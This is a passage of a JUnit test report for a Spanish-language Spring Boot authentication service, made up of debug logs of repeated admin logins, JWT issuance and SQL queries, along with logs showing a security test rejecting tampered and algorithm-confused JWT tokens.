17:10:28.620 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:28.622 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:28.622 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:28 MST 2025, expiration: Wed Jul 02 18:10:28 MST 2025
17:10:28.624 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:28.625 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:28.626 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:28.633 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:28.634 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:28.896 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:28.898 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:28.898 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:28 MST 2025, expiration: Wed Jul 02 18:10:28 MST 2025
17:10:28.899 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:28.901 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:28.901 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:28.908 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:28.909 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:29.175 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:29.177 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:29.177 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:29 MST 2025, expiration: Wed Jul 02 18:10:29 MST 2025
17:10:29.178 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:29.180 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:29.180 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:29.187 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:29.189 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:29.449 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:29.451 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:29.452 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:29 MST 2025, expiration: Wed Jul 02 18:10:29 MST 2025
17:10:29.453 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:29.455 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:29.455 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:29.462 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:29.463 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:29.728 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:29.730 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:29.730 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:29 MST 2025, expiration: Wed Jul 02 18:10:29 MST 2025
17:10:29.732 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:29.733 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:29.734 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:29.741 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:29.742 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:30.002 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:30.005 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:30.005 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:30 MST 2025, expiration: Wed Jul 02 18:10:30 MST 2025
17:10:30.007 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:30.008 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:30.008 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:30.016 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:30.018 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:30.278 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:30.280 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:30.280 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:30 MST 2025, expiration: Wed Jul 02 18:10:30 MST 2025
17:10:30.283 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:30.284 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:30.284 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:30.291 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:30.293 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:30.553 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:30.555 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:30.556 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:30 MST 2025, expiration: Wed Jul 02 18:10:30 MST 2025
17:10:30.557 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:30.559 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:30.559 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:30.567 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:30.568 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:30.827 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:30.829 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:30.829 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:30 MST 2025, expiration: Wed Jul 02 18:10:30 MST 2025
17:10:30.831 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:30.832 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:30.832 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:30.839 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:30.840 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:31.100 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:31.103 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:31.103 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:31 MST 2025, expiration: Wed Jul 02 18:10:31 MST 2025
17:10:31.104 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:31.106 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:31.106 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:31.112 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:31.114 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:31.375 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:31.377 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:31.377 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:31 MST 2025, expiration: Wed Jul 02 18:10:31 MST 2025
17:10:31.378 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:31.380 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:31.380 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:31.387 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:31.388 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:31.653 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:31.656 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:31.656 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:31 MST 2025, expiration: Wed Jul 02 18:10:31 MST 2025
17:10:31.658 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:31.659 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:31.659 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:31.666 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:31.676 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:31.937 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:31.939 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:31.939 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:31 MST 2025, expiration: Wed Jul 02 18:10:31 MST 2025
17:10:31.941 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:31.942 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:31.942 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
]]></system-out>
  </testcase>
  <testcase name="shouldIncludeSecurityHeaders" classname="mx.com.qtx.seguridad.security.SecurityAttackProtectionTest" time="0.009"/>
  <testcase name="shouldRejectManipulatedJwtTokens" classname="mx.com.qtx.seguridad.security.SecurityAttackProtectionTest" time="0.319">
    <system-out><![CDATA[17:10:31.966 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:31.968 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:32.234 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:32.236 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:32.236 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:32 MST 2025, expiration: Wed Jul 02 18:10:32 MST 2025
17:10:32.237 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:32.239 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:32.239 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:32.247 [http-nio-auto-4-exec-6] DEBUG m.c.q.seguridad.service.AuthService - Token inválido: JWT signature does not match locally computed signature. JWT validity cannot be asserted and should not be trusted.
17:10:32.248 [http-nio-auto-4-exec-6] DEBUG m.c.q.s.s.JwtAuthenticationFilter - Token inválido o expirado para request: /seguridad/v1/api/auth/validate
17:10:32.249 [http-nio-auto-4-exec-6] WARN  m.c.q.s.security.JwtExceptionHandler - Error de autenticación para /seguridad/v1/api/auth/validate: Full authentication is required to access this resource
17:10:32.253 [http-nio-auto-4-exec-7] ERROR m.c.qtx.seguridad.service.JwtService - Token JWT no soportado: The parsed JWT indicates it was signed with the 'HS256' signature algorithm, but the provided sun.security.rsa.RSAPublicKeyImpl key may not be used to verify HS256 signatures.  Because the specified key reflects a specific and expected algorithm, and the JWT does not reflect this algorithm, it is likely that the JWT was not expected and therefore should not be trusted.  Another possibility is that the parser was provided the incorrect signature verification key, but this cannot be assumed for security reasons.
17:10:32.253 [http-nio-auto-4-exec-7] DEBUG m.c.q.seguridad.service.AuthService - Token inválido: The parsed JWT indicates it was signed with the 'HS256' signature algorithm, but the provided sun.security.rsa.RSAPublicKeyImpl key may not be used to verify HS256 signatures.  Because the specified key reflects a specific and expected algorithm, and the JWT does not reflect this algorithm, it is likely that the JWT was not expected and therefore should not be trusted.  Another possibility is that the parser was provided the incorrect signature verification key, but this cannot be assumed for security reasons.
17:10:32.255 [http-nio-auto-4-exec-7] DEBUG m.c.q.s.s.JwtAuthenticationFilter - Token inválido o expirado para request: /seguridad/v1/api/auth/validate
17:10:32.255 [http-nio-auto-4-exec-7] WARN  m.c.q.s.security.JwtExceptionHandler - Error de autenticación para /seguridad/v1/api/auth/validate: Full authentication is required to access this resource
17:10:32.260 [http-nio-auto-4-exec-8] DEBUG m.c.q.seguridad.service.AuthService - Token inválido: JWT signature does not match locally computed signature. JWT validity cannot be asserted and should not be trusted.
17:10:32.261 [http-nio-auto-4-exec-8] DEBUG m.c.q.s.s.JwtAuthenticationFilter - Token inválido o expirado para request: /seguridad/v1/api/auth/validate
17:10:32.261 [http-nio-auto-4-exec-8] WARN  m.c.q.s.security.JwtExceptionHandler - Error de autenticación para /seguridad/v1/api/auth/validate: Full authentication is required to access this resource
17:10:32.266 [http-nio-auto-4-exec-9] DEBUG m.c.q.seguridad.service.AuthService - Token inválido: Unable to verify RS256 signature with JCA algorithm 'SHA256withRSA' using key {Sun RSA public key, 2048 bits
  params: null
